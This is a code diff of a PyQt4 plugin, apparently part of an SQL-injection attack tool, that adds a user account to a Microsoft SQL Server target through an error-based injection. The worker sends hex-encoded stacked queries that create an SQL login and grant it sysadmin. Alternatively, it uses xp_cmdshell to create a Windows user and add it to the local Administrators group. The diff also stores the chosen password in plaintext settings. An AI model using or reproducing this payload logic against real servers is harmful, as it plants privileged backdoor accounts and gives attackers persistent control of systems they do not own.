@@ -19,21 +19,26 @@ from core.e_const import CONFIG_PATH
 from core.http import HTTP_Handler
 from PyQt4 import QtCore, QtGui
 
-from gui.mssql.add_user.Ui_add_user import Ui_addUserWidget
+from .ui.Ui_add_user import Ui_addUserWidget
+
 
 PLUGIN_NAME = "ADD_USER"
+PLUGIN_GROUP = "mssql"
+PLUGIN_CLASS_NAME = "AddUserWidget"
+PLUGIN_DESCRIPTION = "Adding SQL or Windows user"
+
 
 class AddUserWidget(QtGui.QWidget):
     
     logSignal = QtCore.pyqtSignal(str)
      
-    def __init__(self, vars, qstring, parent=None):
+    def __init__(self, vars, qstrings, parent=None):
         QtGui.QWidget.__init__(self, parent, QtCore.Qt.Tool)
         self.ui = Ui_addUserWidget()
         self.ui.setupUi(self)
         self.setWindowModality(QtCore.Qt.ApplicationModal)
         self.vars = vars
-        self.qstring = qstring
+        self.qstrings= qstrings
         self.ui.progressBar.hide()
         
         self.ui.addUserButton.clicked.connect(self.addUserButton_OnClick)
@@ -41,8 +46,8 @@ class AddUserWidget(QtGui.QWidget):
         #Load config
         if os.path.exists(CONFIG_PATH):
             settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.IniFormat)
-            self.ui.lineUsername.setText(settings.value('ADD_USER/username', ''))
-            self.ui.linePassword.setText(settings.value('ADD_USER/password', ''))
+            self.ui.lineUsername.setText(settings.value(PLUGIN_NAME + '/username', ''))
+            self.ui.linePassword.setText(settings.value(PLUGIN_NAME + '/password', ''))
             if settings.value("Main/window_position") is not None: 
                 self.move(settings.value("Main/window_position"))
         #---
@@ -75,7 +80,7 @@ class AddUserWidget(QtGui.QWidget):
             self.vars['type'] = 'win'
         #---
         self.ui.progressBar.show()
-        self.worker = Worker(self.vars, self.qstring)
+        self.worker = Worker(self.vars, self.qstrings)
         #Signal connects
         self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
         self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.QueuedConnection)
@@ -85,9 +90,9 @@ class AddUserWidget(QtGui.QWidget):
     #When widget closing
     def closeEvent(self, event):
         #Saving settings
-        settings = QtCore.QSettings("settings/enema.ini", QtCore.QSettings.IniFormat)
-        settings.setValue('ADD_USER/username', self.ui.lineUsername.text())
-        settings.setValue('ADD_USER/password', self.ui.linePassword.text())
+        settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.IniFormat)
+        settings.setValue(PLUGIN_NAME + '/username', self.ui.lineUsername.text())
+        settings.setValue(PLUGIN_NAME + '/password', self.ui.linePassword.text())
         settings.sync()
 
     
@@ -96,10 +101,10 @@ class Worker(QtCore.QThread):
     taskDoneSignal = QtCore.pyqtSignal()
     logSignal = QtCore.pyqtSignal(str)
         
-    def __init__(self, vars, qstring):
+    def __init__(self, vars, qstrings):
         QtCore.QThread.__init__(self)
         self.vars = vars
-        self.qstring = qstring
+        self.qstrings = qstrings
         self.wq = HTTP_Handler()
         self.wq.logSignal.connect(self.log)
         
@@ -115,27 +120,28 @@ class Worker(QtCore.QThread):
         self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
         
     def addUserTask(self):
+        qString = self.qstrings.value('mssql_error_based/exec_hex')
         if self.vars['type'] == "sql":
             #Adding sql user
             hex = core.txtproc.strToHex("master..sp_addlogin '" + self.vars['username']\
             + "','" + self.vars['password'] + "'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+            query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
             #Adding 'sysadmin' rights for our user
             hex = core.txtproc.strToHex("master..sp_addsrvrolemember '" + self.vars['username']\
             + "','sysadmin'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+            query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
         else:
             #Adding windows user
             hex = core.txtproc.strToHex("master..xp_cmdshell 'net user " + self.vars['username']\
             + " " + self.vars['password'] + " /ADD'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+            query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
             #Adding windows user to local group 'Administrators'
             hex = core.txtproc.strToHex("master..xp_cmdshell 'net localgroup Administrators "\
             + self.vars['username'] + " /ADD'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+            query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
